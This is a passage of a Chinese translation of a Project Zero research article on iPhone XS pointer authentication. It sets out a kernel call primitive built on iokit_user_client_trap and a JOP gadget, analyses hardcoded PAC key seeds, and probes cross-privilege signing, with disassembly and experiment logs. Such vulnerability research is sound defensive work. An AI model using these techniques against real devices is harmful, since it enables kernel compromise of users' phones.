@@ -1,0 +1,994 @@
+# 看我如何绕过 iPhone XS 中指针验证机制（下）
+
+阅读量 **422599**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2019-02-28 16:00:54
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章，文章原作者 googleprojectzero，文章来源：googleprojectzero.blogspot.com
+
+原文地址：<https://googleprojectzero.blogspot.com/2019/02/examining-pointer-authentication-on.html>
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p3.ssl.qhimg.com/t0104789561e931d9eb.jpg)
+
+上一章中，我们对当前的PAC机制在理论上提出了一些可能的漏洞，这一章结合实际的 A12 设备进行验证。该篇可能会比较长，如果大家没有耐心，可以直接跳转到
+<第四个缺陷出现！>一节。
+
+## 寻找内核代码执行的入口点
+
+现在我们已经对如何在 A12 设备上绕过和伪造 PAC 有了一些理论的想法，接下来，我们将要研究如何真正的绕过 PAC 来执行内核中的任意代码。
+
+传统的读写内核代码的方法是 Stefan Esser 在[Tales from iOS 6
+Exploitation](https://conference.hitb.org/hitbsecconf2013kul/materials/D2T2%20-%20Stefan%20Esser%20-%20Tales%20from%20iOS%206%20Exploitation%20and%20iOS%207%20Security%20Changes.pdf)中提到的
+iokit_user_client_trap 策略。此策略需要 patch IOUserClient 实例的 vtable 来调用用户态的函数
+IOConnectTrap6()，它可以调用任意函数，并且传入最多7个参数。这样就能在内核中调用 iokit_user_client_trap() 函数了。  
+如果想要了解其工作原理，可以参考下面 XNU 4903.221.2 中 iokit_user_client_trap() 的实现：
+
+    
+    
+    kern_return_t iokit_user_client_trap(struct iokit_user_client_trap_args *args)
+    {
+       kern_return_t result = kIOReturnBadArgument;
+       IOUserClient *userClient;
+       if ((userClient = OSDynamicCast(IOUserClient,
+               iokit_lookup_connect_ref_current_task((mach_port_name_t)
+                   (uintptr_t)args->userClientRef)))) {
+           IOExternalTrap *trap;
+           IOService *target = NULL;
+           trap = userClient->getTargetAndTrapForIndex(&target, args->index);
+           if (trap && target) {
+               IOTrap func;
+               func = trap->func;
+               if (func) {
+                   result = (target->*func)(args->p1, args->p2, args->p3,
+                                            args->p4, args->p5, args->p6);
+               }
+           }
+           iokit_remove_connect_reference(userClient);
+       }
+       return result;
+    }
+    
+
+如果我们能够 patch IOUserClient 实例，使得 getTargetAndTrapForIndex() 返回的 trap 和 target
+是我们可控的值，那么下面调用 target->func 将可以调用任意内核函数，并且传入最多7个参数(p1 到 p6 加上 target 本身)。
+
+为了了解这个策略在 A12 设备上能否成功，让我们来看看 PAC 引入的对这个功能的更改。
+
+    
+    
+    iokit_user_client_trap
+       PACIBSP
+       ...        ;; Call iokit_lookup_connect_ref_current_task() on
+       ...        ;; args->userClientRef and cast the result to IOUserClient.
+    
+    loc_FFFFFFF00808FF00
+       STR        XZR, [SP,#0x30+var_28]  ;; target = NULL
+       LDR        X8, [X19]               ;; x19 = userClient, x8 = ->vtable
+       AUTDZA     X8                      ;; validate vtable's PAC
+       ADD        X9, X8, #0x5C0          ;; x9 = pointer to vmethod in vtable
+       LDR        X8, [X8,#0x5C0]         ;; x8 = vmethod getTargetAndTrapForIndex
+       MOVK       X9, #0x2BCB,LSL#48      ;; x9 = 2BCB`vmethod_pointer
+       LDR        W2, [X20,#8]            ;; w2 = args->index
+       ADD        X1, SP, #0x30+var_28    ;; x1 = &target
+       MOV        X0, X19                 ;; x0 = userClient
+       BLRAA      X8, X9                  ;; PAC call ->getTargetAndTrapForIndex
+       LDR        X9, [SP,#0x30+var_28]   ;; x9 = target
+       CMP        X0, #0
+       CCMP       X9, #0, #4, NE
+       B.EQ       loc_FFFFFFF00808FF84    ;; if !trap || !target
+       LDP        X8, X11, [X0,#8]        ;; x8 = trap->func, x11 = func virtual?
+       AND        X10, X11, #1
+       ORR        X12, X10, X8
+       CBZ        X12, loc_FFFFFFF00808FF84       ;; if !func
+       ADD        X0, X9, X11,ASR#1       ;; x0 = target
+       CBNZ       X10, loc_FFFFFFF00808FF58
+       MOV        X9, #0                  ;; Use context 0 for non-virtual func
+       B          loc_FFFFFFF00808FF70
+    
+    loc_FFFFFFF00808FF58
+       ...        ;; Handle the case where trap->func is a virtual method.
+    
+    loc_FFFFFFF00808FF70
+       LDP        X1, X2, [X20,#0x10]     ;; x1 = args->p1, x2 = args->p2
+       LDP        X3, X4, [X20,#0x20]     ;; x3 = args->p3, x4 = args->p4
+       LDP        X5, X6, [X20,#0x30]     ;; x5 = args->p5, x6 = args->p6
+       BLRAA      X8, X9                  ;; PAC call func(target, p1, ..., p6)
+       MOV        X21, X0
+    
+    loc_FFFFFFF00808FF84
+       ...        ;; Call iokit_remove_connect_reference().
+    
+    loc_FFFFFFF00808FF8C
+       ...        ;; Epilogue.
+       RETAB
+    
+
+我们可以看到，有几个地方对 PAC 进行了验证: 第一个地方是出现在动态切换到 IOUserClient。 然后会验证 userClient 的
+vtable，然后在 PAC 的保护下，调用 getTargetAndTrapForIndex。
+
+再然后，在读取 trap->func 时并没有验证，然后 func 函数在调用时会被验证，使用的上下文是 0.
+
+这种机制对于攻击者来说已经非常好了。 如果我们能找到一个合法的用户，让它来提供 getTargetAndTrapForIndex() 的实现，而这个
+getTargetAndTrapForIndex 能够返回一个指向驻留在可写内存中的 IOExternalTrap 的指针。 那么我们只需要考虑如何将
+trap->func 替换成我们的函数指针就行了，但是这个函数指针是受 PAC 保护的，它使用 APIAKEY 签名了，上下文为 0。 这意味着我们只要绕过
+PAC 一次就足够了，即伪造 PACIZA 签名过的指针。
+
+稍微找了一下，在 kernelcache 中发现一个特别的 IOUserClient 类， IOAudio2DeviceUserClient
+，它符合这些条件。下面是它的getTargetAndTrapForIndex() 方法的反编译:
+
+    
+    
+    IOExternalTrap *IOAudio2DeviceUserClient::getTargetAndTrapForIndex(
+           IOAudio2DeviceUserClient *this, IOService **target, unsigned int index)
+    {
+       ...
+       *target = (IOService *)this;
+       return &this->IOAudio2DeviceUserClient.traps[index];
+    }
+    
+
+在 IOAudio2DeviceUserClient::initializeExternalTrapTable() 中， traps
+字段会被初始化为堆分配的 IOExternalTrap 对象：
+
+    
+    
+    this->IOAudio2DeviceUserClient.trap_count = 1;
+    this->IOAudio2DeviceUserClient.traps = IOMalloc(sizeof(IOExternalTrap));
+    
+
+因此，我们所需要做的就是创建一个自己的 IOAudio2DeviceUserClient 连接，伪造一个 PACIZA 指针，然后覆盖了用这个指针覆盖
+userClient->traps[0].func，最后再再用户态调用 IOConnectTrap6 。这样我们就可以控制除 X0 之外的所有参数，因为
+X0 是由 IOAudio2DeviceUserClient 的 getTargetAndTrapForIndex() 显式设置的。
+
+为了控制 X0，我们需要替换 vtable 中 IOAudio2DeviceUserClient 对 getTargetAndTrapForIndex()
+的实现。这意味着，除了伪造我们调用的函数的 PACIZA 指针外，我们还需要伪造 vtable，它是由指向虚方法的 PACIA
+指针组成。所以，我们需要用一个 vtable 的 PACDZA 的指针替换当前 vtable 指针。而这就需要一些更加复杂的 PAC 伪造技术了。
+
+然而，即使我们只能伪造 PACIZA 指针，仍然有一种方法可以控制X0 : JOP gadget。通过 kernelcache
+进行快速搜索，可以发现以下设置 X0 的代码:
+
+    
+    
+    MOV         X0, X4
+    BR          X5
+    
+
+这使我们可以只使用一个伪造指针，就能调用任意少于 4 个参数的内核函数: 使用 iokit_user_client_trap()
+调用指向这个代码的指针，这个指针已经被 PACDZA 签名过了，然后将 X4 设置为我们期望的 X0 值，X5 设置为 我们想要调用的函数。
+
+## 分析在 A12 上的 PAC
+
+现在我们已经知道了如何使用 PAC 伪造来调用任意的内核函数，下面我们开始分析苹果在 A12 芯片上实现的 PAC
+的脆弱点。理想情况下，我们能够找到一种方法来同时执行PACIA和PACDA
+签名的伪造，但是正如前面所讨论的，即使伪造单个PACIZA指针，也需要调用任意4个参数内核函数的能能力。
+
+为了能够展开分析，我使用 [voucher_swap](https://bugs.chromium.org/p/project-zero/issues/detail?id=1731#c10) 来读写 iPhone XR 的内核，收集的操作系统为 iOS 12.1.1 build
+16C50 版。
+
+###  在内核中找到 PAC 的密钥
+
+第一步是要找到 PAC 的密钥在内核中是如何赋值的。不幸的是， IDA 并不显示用于存储 PAC 密钥的名称，因此我不得不一点点的向下挖掘。
+
+在 [LLVM](https://github.com/llvm-mirror/llvm/) 仓库中，查找 “APIAKEY”, 显示存储 APIAKEY
+的寄存器叫做 APIAKeyLo_EL1 和 APIAKeyHi_EL1， 存储其他密钥的寄存器命名也都相似。
+
+在文件 [AArch64SystemOperands.td](https://github.com/llvm-mirror/llvm/blob/efea7114d4f7bc56ab90df04037bdb7cd7d4f8c3/lib/Target/AArch64/AArch64SystemOperands.td#L1289)
+中的代码声明了这些寄存器。 这是我们可以在 IDA 中很轻松的找到这些寄存器。 比如，要查找 APIAKeyLo_EL1 赋值的过程，我查找字符串 “#0,
+c2, c1, #0”，这让我想到了common_start的一部分，可以参考文件
+[osfmk/arm64/start.s](https://opensource.apple.com/source/xnu/xnu-4903.221.2/osfmk/arm64/start.s.auto.html):
+
+    
+    
+    _WriteStatusReg(TCR_EL1, sysreg_restore);               // 3, 0, 2, 0, 2
+    PPLTEXT__set__TTBR0_EL1(x25 & 0xFFFFFFFFFFFF);
+    _WriteStatusReg(TTBR1_EL1, (x25 + 0x4000) & 0xFFFFFFFFFFFF);    // 3, 0, 2, 0, 1
+    _WriteStatusReg(MAIR_EL1, 0x44F00BB44FF);               // 3, 0, 10, 2, 0
+    if ( x21 )
+       _WriteStatusReg(TTBR1_EL1, cpu_ttep);               // 3, 0, 2, 0, 1
+    _WriteStatusReg(VBAR_EL1, ExceptionVectorsBase + x22 - x23);    // 3, 0, 12, 0, 0
+    do
+       x0 = _ReadStatusReg(S3_4_C15_C0_4);                 // ????
+    while ( !(x0 & 2) );
+    _WriteStatusReg(S3_4_C15_C0_4, x0 | 5);                 // ????
+    __isb(0xF);
+    _WriteStatusReg(APIBKeyLo_EL1, 0xFEEDFACEFEEDFACF);     // 3, 0, 2, 1, 2
+    _WriteStatusReg(APIBKeyHi_EL1, 0xFEEDFACEFEEDFACF);     // 3, 0, 2, 1, 3
+    _WriteStatusReg(APDBKeyLo_EL1, 0xFEEDFACEFEEDFAD0);     // 3, 0, 2, 2, 2
+    _WriteStatusReg(APDBKeyHi_EL1, 0xFEEDFACEFEEDFAD0);     // 3, 0, 2, 2, 3
+    _WriteStatusReg(S3_4_C15_C1_0, 0xFEEDFACEFEEDFAD1);     // ????
+    _WriteStatusReg(S3_4_C15_C1_1, 0xFEEDFACEFEEDFAD1);     // ????
+    _WriteStatusReg(APIAKeyLo_EL1, 0xFEEDFACEFEEDFAD2);     // 3, 0, 2, 1, 0
+    _WriteStatusReg(APIAKeyHi_EL1, 0xFEEDFACEFEEDFAD2);     // 3, 0, 2, 1, 1
+    _WriteStatusReg(APDAKeyLo_EL1, 0xFEEDFACEFEEDFAD3);     // 3, 0, 2, 2, 0
+    _WriteStatusReg(APDAKeyHi_EL1, 0xFEEDFACEFEEDFAD3);     // 3, 0, 2, 2, 1
+    _WriteStatusReg(APGAKeyLo_EL1, 0xFEEDFACEFEEDFAD4);     // 3, 0, 2, 3, 0
+    _WriteStatusReg(APGAKeyHi_EL1, 0xFEEDFACEFEEDFAD4);     // 3, 0, 2, 3, 1
+    _WriteStatusReg(SCTLR_EL1, 0xFC54793D);                 // 3, 0, 1, 0, 0
+    __isb(0xF);
+    _WriteStatusReg(CPACR_EL1, 0x300000);                   // 3, 0, 1, 0, 2
+    _WriteStatusReg(TPIDR_EL1, 0);                          // 3, 0, 13, 0, 4
+    
+
+很有意思的是，看起来像是 common_start 在每次内核启动时都会给 PAC 的密钥赋一个固定值。
+考虑到这可能是因为反编译的关系，我检查了反编译的过程:
+
+    
+    
+    common_start+A8
+       LDR        X0, =0xFEEDFACEFEEDFACF ;; x0 = pac_key
+       MSR        #0, c2, c1, #2, X0      ;; APIBKeyLo_EL1
+       MSR        #0, c2, c1, #3, X0      ;; APIBKeyHi_EL1
+       ADD        X0, X0, #1
+       MSR        #0, c2, c2, #2, X0      ;; APDBKeyLo_EL1
+       MSR        #0, c2, c2, #3, X0      ;; APDBKeyHi_EL1
+       ADD        X0, X0, #1
+       MSR        #4, c15, c1, #0, X0     ;; ????
+       MSR        #4, c15, c1, #1, X0     ;; ????
+       ADD        X0, X0, #1
+       MSR        #0, c2, c1, #0, X0      ;; APIAKeyLo_EL1
+       MSR        #0, c2, c1, #1, X0      ;; APIAKeyHi_EL1
+       ADD        X0, X0, #1
+       MSR        #0, c2, c2, #0, X0      ;; APDAKeyLo_EL1
+       MSR        #0, c2, c2, #1, X0      ;; APDAKeyHi_EL1
+    ...
+    pac_key
+       DCQ 0xFEEDFACEFEEDFACF      ; DATA XREF: common_start+A8↑r
+    
+
+还真的不是因为反编译，common_start 的确是每次初始化 PAC
+密钥时都会给一个固定值。这很令人吃惊，我不相信苹果不知道，使用固定值给密钥赋值会导致所有的 PAC 安全机制的失效。所以我想 PAC
+密钥肯定还会在其他地方被初始化为它们真正的运行时值。
+
+但是在多次搜索之后，这似乎是 kernelcache 中唯一设置 A 密钥和通用密钥的位置。尽管如此，B 密钥似乎在其他地方有过重新的赋值:
+
+    
+    
+    machine_load_context+A8
+       LDR        X1, [X0,#0x458]
+       ...
+       MSR        #0, c2, c1, #2, X1      ;; APIBKeyLo_EL1
+       MSR        #0, c2, c1, #3, X1      ;; APIBKeyHi_EL1
+       ADD        X1, X1, #1
+       MSR        #0, c2, c2, #2, X1      ;; APDBKeyLo_EL1
+       MSR        #0, c2, c2, #3, X1      ;; APDBKeyHi_EL1
+    
+    Call_continuation+10
+       LDR        X5, [X4,#0x458]
+       ...
+       MSR        #0, c2, c1, #2, X5      ;; APIBKeyLo_EL1
+       MSR        #0, c2, c1, #3, X5      ;; APIBKeyHi_EL1
+       ADD        X5, X5, #1
+       MSR        #0, c2, c2, #2, X5      ;; APDBKeyLo_EL1
+       MSR        #0, c2, c2, #3, X5      ;; APDBKeyHi_EL1
+    
+    Switch_context+11C
+       LDR        X3, [X2,#0x458]
+       ...
+       MSR        #0, c2, c1, #2, X3      ;; APIBKeyLo_EL1
+       MSR        #0, c2, c1, #3, X3      ;; APIBKeyHi_EL1
+       ADD        X3, X3, #1
+       MSR        #0, c2, c2, #2, X3      ;; APDBKeyLo_EL1
+       MSR        #0, c2, c2, #3, X3      ;; APDBKeyLo_EL1
+    
+    Idle_load_context+88
+       LDR        X1, [X0,#0x458]
+       ...
+       MSR        #0, c2, c1, #2, X1      ;; APIBKeyLo_EL1
+       MSR        #0, c2, c1, #3, X1      ;; APIBKeyHi_EL1
+       ADD        X1, X1, #1
+       MSR        #0, c2, c2, #2, X1      ;; APDBKeyLo_EL1
+       MSR        #0, c2, c2, #3, X1      ;; APDBKeyHi_EL1
+    
+
+除了开始的赋值，上面这是内核中唯一一处对 PAC 密钥赋值的地方了。并且他们都是用了相同的模式：在偏移量为 0x458 处向某个数据结构中载入 64
+比特。然后将APIBKey设置为与自身串接的值，并将APDBKey设置为APIBKey加上1
+
+此外，所有这些位置的代码都时用来处理线程之间的上下文切换; 显然，没有任何迹象表明，PAC
+密钥在异常级别切换时被更改，同样在内核进入(syscall)或内核进出(ERET*)时也没有被更改。
+
+这很有可能表示，PAC的密钥实际上是在用户态和内核态之间共享的！！！
+
+如果我的理解是正确的，这似乎表明了三件非常可怕的事情：
+
+首先，与所有密码学规则相反，内核似乎对A密钥和通用密钥使用了固定值。
+
+其次，由于128位密钥的前半部分和后半部分是相同的，因此密钥实际上是64位的。
+
+第三，PAC密钥似乎在用户空间和内核之间共享，这意味着用户空间可以伪造内核PAC签名。
+
+然而，苹果的的安全机制真的会那么糟糕吗?还是有什么我们不知道的问题?
+
+###  研究运行过程中的行为
+
+为了进一步研究，我们做了一个小小的实验：我读取了的一个函数指针的值，这个指针是被 PACIZA 签名过的，位于 **DATA_CONST.** const
+段中，记录每次 kASLR slide 的值。由于内核 slide
+的可能值是非常少的，用不了多久，我就会在内存同一个位置得到两次不同的内核引导。这意味着指针的原始非pac值两次都是相同的。然后，如果A密钥确实是常量，那么PACIZA
+签名后的指针的值在两个引导中应该是相同的，因为签名算法是确定性的，而且被签名的指针和上下文值在两次引导中都是相同的。
+
+作为一个目标，我选择去读取 sysclk_ops.c_gettime， sysclk_ops.c_gettime 是一个指向
+rtclock_gettime() 的指针。下面是30次实验的结果，有 slide 相同的两次实验已经内标注出来了。
+
+![](https://raw.githubusercontent.com/bizky/Images/master/7-1.png)
+
+我们可以看到，尽管我们认为A密钥是相同的，但是在不同的引导中生成相同指针的PACIZA 是不同的。
+
+我认为最有可能的是 iBoot 或者内核会在引导时用一个随机值覆盖 pac_key 的值。所以 PAC 的值在每次启动时确实是不一样的。即使 pac_key
+保存在 **TEXT_EXEC.** text 中，通过 KTRR 保护它不被改写，但是仍然可以在 KTRR 锁定前对其进行修改。然而，在运行过程中读取
+pac_key， 它的值仍然是 0xfeedfacefeedfacf，因此一定还有什么机制在影响 pac_key。
+
+接下来，我又做了一个实验，以确定 PAC 密钥是否真的像代码里写的那样在用户空间和内核之间共享。我在用户空间中对 rtclock_gettime()
+函数的指针执行 PACIZA 操作，然后与 PACIZA 签名后的的 sysclk_ops.c_gettime
+指针进行比较。然而，这两个值时不同的，尽管我们预想它应该是相同，因此 A12 似乎又使用了什么黑科技。
+
+到现在位置，我仍然不太相信 pac_key 的值在运行时没有被修改，我尝试枚举系统上所有线程的 B 密钥，看看它们是否是代码中写的
+0xfeedfacefeedfacf。通过查看[osfmk/arm64/cswitch.s](https://opensource.apple.com/source/xnu/xnu-4903.221.2/osfmk/arm64/cswitch.s.auto.html)中
+Switch_context 的代码。我明白了用作计算 B 密钥的种子是从 struct thread 的偏移 0x458 装载的，这个位置在 XNU
+中是没有被公开的，所以我决定命名它为 pac_key_seed。因此，我准备便利所有线程并且读取所有线程的 pac_key_seed。
+
+实验完成后，我发现所有内核线程实际上都在使用0xfeedfacefeedfacf作为PAC密钥的种子，而用户空间的线程使用的是另一个随机的种子:
+
+    
+    
+    pid   0  thread ffffffe00092c000  pac_seed feedfacefeedfacf
+    pid   0  thread ffffffe00092c550  pac_seed feedfacefeedfacf
+    pid   0  thread ffffffe00092caa0  pac_seed feedfacefeedfacf
+    ...
+    pid 258  thread ffffffe003597520  pac_seed 51c6b449d9c6e7a3
+    pid 258  thread ffffffe003764aa0  pac_seed 51c6b449d9c6e7a3
+    
+
+因此，似乎内核线程的 PAC 密钥在每次引导时都被初始化为相同的，但是签名后的指针在不同的引导下是不同的。这又是为什么呢？
+
+###  尝试绕过
+
+接下来，我将我关注的重点之前在“面对内核层攻击者的设计缺陷”一节中提到的三个设计缺陷上。
+
+由于在不同的引导下，使用相同的 PACIZA 指令，对于相同的指针，使用相同的 PAC
+密钥，生成的结果是不同的，因此在每次引导后一定会产生一个随机的值。这基本上意味着 “在用户空间中实现QARMA-64算法并手动计算PAC”
+这种方法的无效，但我还是决定尝试一下。不出所料，这没有奏效。
+
+接下来，我向看看是否可以将自己线程的PAC密钥设置为内核PAC密钥，并在用户空间中伪造内核指针。理想情况下，这意味着我将把我的 IA 密钥设置为内核的 IA
+密钥，即0xfeedfacefeedfad2。然而，正如前面所讨论的，内核中似乎只有一个地方(common_start)对A密钥赋值，但是用户空间和内核的PAC是不同的。因此，我决定将这种方法与
+PAC 密钥交叉对称的缺点结合起来，将线程的 IB 密钥设置为内核的IA密钥，这应该允许我通过在用户空间中执行 PACIZB 来伪造内核 PACIZA
+指针签名。
+
+不幸的是，这种简单的方法(通过覆盖当前线程中的pac_key_seed字段)可能会导致系统异常崩溃，因为在线程的生命周期中更改 PAC 密钥会破坏线程现有的
+PAC 签名。PAC 签名的检查是覆盖整个县城周期的。这意味着，想要更改线程的 PAC
+密钥而不会使其崩溃，只能确保在更改密钥时线程不会调用函数或从任何函数返回。
+
+最简单的方法是生成一个线程，该线程在用户空间中无限循环执行 PACIZB 并将结果存储到一个全局变量中。然后我们可以覆盖线程的 pac_key_seed
+强制线程离开内核; 一旦离开内核的线程被重新调度，它的 B 密钥将通过 Switch_context 设置，然后开始伪造 PAC。
+
+然而，实验结果再次失败:
+
+    
+    
+    gettime       = fffffff0161f2050
+    kPACIZA       = faef2270161f2050
+    uPACIZA       = 138a8670161f2050
+    uPACIZB forge = d7fd0ff0161f2050
+    
+
+为了了解的更深入一点，我设计了一个专门针对密钥交叉的伪造 PAC 的测试。我将的线程的 IB 密钥设置为 DB 密钥，并检查 PACIZB 和 PACDZB
+的输出是否相似，如果相似，就代表生成了相同的 PAC。因为 IB 和 DB
+密钥是由相同的种子生成的，不能单独设置，所以这实际上涉及两个试验:第一个试验使用种子值0x11223344，第二个试验使用种子值0x11223345:
+
+    
+    
+    IB = 0x11223344  uPACIZB = 0028180100000000
+    DB = 0x11223345  uPACDZB = 00679e0100000000
+    IB = 0x11223345  uPACIZB = 003ea80100000000
+    DB = 0x11223346  uPACDZB = 0023c58100000000
+    
+
+中间两行显示了使用相同密钥从用户空间对相同值执行 PACDZB 和 PACIZB 的结果。根据指针验证的标准 ARMv8.3 中，我们认为两个 PAC
+应该是一样的。然而，这两个 PAC 似乎完全不同，这表明A12确实已经做了防御。
+
+###  理论上的实现方案
+
+由于最初考虑的三个弱点明显不再适用于 A12， 现在我们需要考虑到底是什么导致的。
+
+首先很明显，苹果意识到了在白皮书中定义的指针验证机制不能够抵抗读写内核的攻击者，因此他们实现了更高强度的防御。如果不对芯片进行逆向工程，我们不可能知道他们到底做了什么，但是我们可以根据观察到的行为进行推测。
+
+我的第一个想法是，苹果重新加入了 secure monitor 机制，就像它在之前的设备上所做的那样，用 Watchtower 来防止内核补丁。如果
+secure monitor 能够捕获 EL 之间的转换，并捕获对 PAC 密钥寄存器的写入，那么它就可以向内核隐藏真正的 PAC
+密钥，并利用其他方法来破坏 PAC 的对称性。然而，我无法在内核中找到 secure monitor 存在的证据。
+
+另一种选择是，苹果将真正的 PAC 密钥转移到 A12 本身，这样即使是最强大的软件攻击者也无法读取密钥。密钥可以在引导时随机生成，也可以通过 iBoot
+的特殊寄存器进行设置。然后，提供给 QARMA-64
+算法(或自己开发的算法)的密钥将是一种混合密钥，它结合了随机密钥、通过特殊寄存器设置的标准密钥和当前的异常级别。
+
+比如说， A12 可以存储 10 个 128 比特的密钥，分别对应了两个异常级别(EL0和EL1)以及五个基本 PAC
+密钥(IA,IB,DA,DB,GA)。那么，用于任何特定操作的 PAC 密钥可以是与该操作相对应的随机PAC密钥(如用户空间中的 PACIB
+指令对那个的IB-EL0)与标准 PAC 密钥(如
+APIBKey)的异或。这种方法它将彻底打破跨EL和密钥交叉的对称性，并防止密钥被公开，从而完全缓解之前确定的三个弱点。
+
+虽然我不能确定它真正实现的方法，但我决定在我研究的其余部分都假设苹果采用最健壮的设计:真正的键是随机的，并存储在SoC本身中。这样，无论实际实现如何，我之后发现的任何绕过策略都会有效。
+
+###  跨 EL 的PAC仍然可行
+
+由于没有系统缺陷的线索，我决定是时候研究 PAC 的 signing gadget了。
+
+第一个 PACIA 指令出现在 vm_shared_region_slide_page() 函数中，它是
+vm_shared_region_slide_page_v3() 的一个内联副本。这个函数出现在XNU源代码中，在它的主循环的注释十分有趣:
+
+    
+    
+    uint8_t* rebaseLocation = page_content;
+    uint64_t delta = page_entry;
+    do {
+       rebaseLocation += delta;
+       uint64_t value;
+       memcpy(&value, rebaseLocation, sizeof(value));
+       delta = ( (value & 0x3FF8000000000000) >> 51) * sizeof(uint64_t);
+    
+       // A pointer is one of :
+       // {
+       //     uint64_t pointerValue : 51;
+       //     uint64_t offsetToNextPointer : 11;
+       //     uint64_t isBind : 1 = 0;
+       //     uint64_t authenticated : 1 = 0;
+       // }
+       // {
+       //     uint32_t offsetFromSharedCacheBase;
+       //     uint16_t diversityData;
+       //     uint16_t hasAddressDiversity : 1;
+       //     uint16_t hasDKey : 1;
+       //     uint16_t hasBKey : 1;
+       //     uint16_t offsetToNextPointer : 11;
+       //     uint16_t isBind : 1;
+       //     uint16_t authenticated : 1 = 1;
+       // }
+    
+       bool isBind = (value & (1ULL << 62)) == 1;
+       if (isBind) {
+           return KERN_FAILURE;
+       }
+    
+       bool isAuthenticated = (value & (1ULL << 63)) != 0;
+    
+       if (isAuthenticated) {
+           // The new value for a rebase is the low 32-bits of the threaded value
+           // plus the slide.
+           value = (value & 0xFFFFFFFF) + slide_amount;
+           // Add in the offset from the mach_header
+           const uint64_t value_add = s_info->value_add;
+           value += value_add;
+    
+       } else {
+           // The new value for a rebase is the low 51-bits of the threaded value
+           // plus the slide. Regular pointer which needs to fit in 51-bits of
+           // value. C++ RTTI uses the top bit, so we'll allow the whole top-byte
+           // and the bottom 43-bits to be fit in to 51-bits.
+           ...
+       }
+    
+       memcpy(rebaseLocation, &value, sizeof(value));
+    } while (delta != 0);
+    
+
+尽管真正执行 PAC 操作的所有代码都已从公共源码中删除，但这部分代码中包含 authenticated 、hasBKey 和
+hasDKey，表明该代码正是处理经过指针验证的函数。此外，关于 C++ RTTI
+的另一个注释表明，这段代码是为了承接用户空间的代码。这意味着内核很有可能会对用户空间的指针执行 PAC 操作。
+
+下面是这个循环在IDA中的反编译，我们可以看到在公共源代码中有许多不存在的操作:
+
+    
+    
+    slide_amount = si->slide;
+    offset = uservaddr - rebaseLocation;
+    do
+    {
+       rebaseLocation += delta;
+       value = *(uint64_t *)rebaseLocation;
+       delta = (value >> 48) & 0x3FF8;
+       if ( value & 0x8000000000000000 )       // isAuthenticated
+       {
+           value = slide_amount + (uint32_t)value + slide_info_entry->value_add;
+           context = (value >> 32) & 0xFFFF;   // diversityData
+           if ( value & 0x1000000000000 )      // hasAddressDiversity
+               context = (offset + rebaseLocation) & 0xFFFFFFFFFFFF
+                       | (context << 48);
+           if ( si->UNKNOWN_FIELD && !(BootArgs->bootFlags & 0x4000000000000000) )
+           {
+               daif = _ReadStatusReg(ARM64_SYSREG(3, 3, 4, 2, 1));// DAIF
+               if ( !(daif & 0x80) )
+                   __asm { MSR             #6, #3 }
+               _WriteStatusReg(S3_4_C15_C0_4,
+                   _ReadStatusReg(S3_4_C15_C0_4) & 0xFFFFFFFFFFFFFFFB);
+               __isb(0xFu);
+               key_bits = (value >> 49) & 3;
+               switch ( key_bits )
+               {
+                   case 0:
+                       value = ptrauth_sign...(value, ptrauth_key_asia, &context);
+                       break;
+                   case 1:
+                       value = ptrauth_sign...(value, ptrauth_key_asib, &context);
+                       break;
+                   case 2:
+                       value = ptrauth_sign...(value, ptrauth_key_asda, &context);
+                       break;
+                   case 3:
+                       value = ptrauth_sign...(value, ptrauth_key_asdb, &context);
+                       break;
+               }
+               _WriteStatusReg(S3_4_C15_C0_4, _ReadStatusReg(S3_4_C15_C0_4) | 4);
+               __isb(0xFu);
+               ml_set_interrupts_enabled(~(daif >> 7) & 1);
+           }
+       }
+       else
+       {
+           ...
+       }
+       memmove(rebaseLocation, &value, 8);
+    }
+    while ( delta );
+    
+
+内核似乎会代表用户空间对指针进行签名。这很有趣，因为正如前面所讨论的，A12 否定了我们跨 EL
+伪造指针的思路，这应该意味着内核在用户空间指针上的签名，而这个签名在用户空间中本应该是无效的。
+
+但是这写隐藏起来的代码不太可能是无效的，因此必定有一些机制，内核通过这种机制能够对用户空间指针进行签名。之后，我们搜索其他的 PAC*
+指令实例，可以找到一个固定的模式：每当内核为用户空间指针签名时，它会清除并设置S3_4_C15_C0_4系统寄存器中的一个比特来封装PAC指令：
+
+    
+    
+    MRS         X8, #4, c15, c0, #4 ; S3_4_C15_C0_4
+    AND         X8, X8, #0xFFFFFFFFFFFFFFFB
+    MSR         #4, c15, c0, #4, X8 ; S3_4_C15_C0_4
+    ISB
+    
+    ...         ;; PAC stuff for userspace
+    
+    MRS         X8, #4, c15, c0, #4 ; S3_4_C15_C0_4
+    ORR         X8, X8, #4
+    MSR         #4, c15, c0, #4, X8 ; S3_4_C15_C0_4
+    ISB
+    
+
+同样，设置和清除 S3_4_C15_C0_4 为 0x4 的内核代码通常伴随着禁用中断并检查引导BootArgs->bootFlags
+内容((BootArgs->bootFlags &
+0x4000000000000000))，正如我们在上面vm_shared_region_slide_page_v3()中所看到的那样。
+
+我们可以推断，S3_4_C15_C0_4 为 0x4 控制内核中的 PAC* 指令是使用 EL0
+密钥还是EL1密钥:当设置这个位时，使用内核密钥，否则使用用户空间密钥。在清除这个位时，需要禁用中断，这也是十分合理的。否则，其他内核代码在使用EL0
+PAC密钥时遇到中断，会导致PAC验证失败，从而使内核崩溃。
+
+###  SCTLR_EL1 中发现了 PAC 的控制位。
+
+我在调查系统寄存器时注意到的另一件事是，以前SCTLR_EL1的保留位现在被用于启用或禁用某些密钥的PAC指令。在研究
+Lel0_synchronous_vector_64 时，我注意到一些代码引用了bootFlags并为 SCTLR_EL1 设置了一些值。
+
+    
+    
+    ADRP        X0, #const_boot_args@PAGE
+    ADD         X0, X0, #const_boot_args@PAGEOFF
+    LDR         X0, [X0,#(const_boot_args.bootFlags - 0xFFFFFFF0077A21B8)]
+    AND         X0, X0, #0x8000000000000000
+    CBNZ        X0, loc_FFFFFFF0079B3320
+    MRS         X0, #0, c1, c0, #0                  ;; SCTLR_EL1
+    TBNZ        W0, #0x1F, loc_FFFFFFF0079B3320
+    ORR         X0, X0, #0x80000000                 ;; set bit 31
+    ORR         X0, X0, #0x8000000                  ;; set bit 27
+    ORR         X0, X0, #0x2000                     ;; set bit 13
+    MSR         #0, c1, c0, #0, X0                  ;; SCTLR_EL1
+    
+
+此外，这些位在异常返回时会被有条件地清除
+
+    
+    
+    TBNZ        W1, #2, loc_FFFFFFF0079B3AE8        ;; SPSR_EL1.M[3:0] & 0x4
+    ...
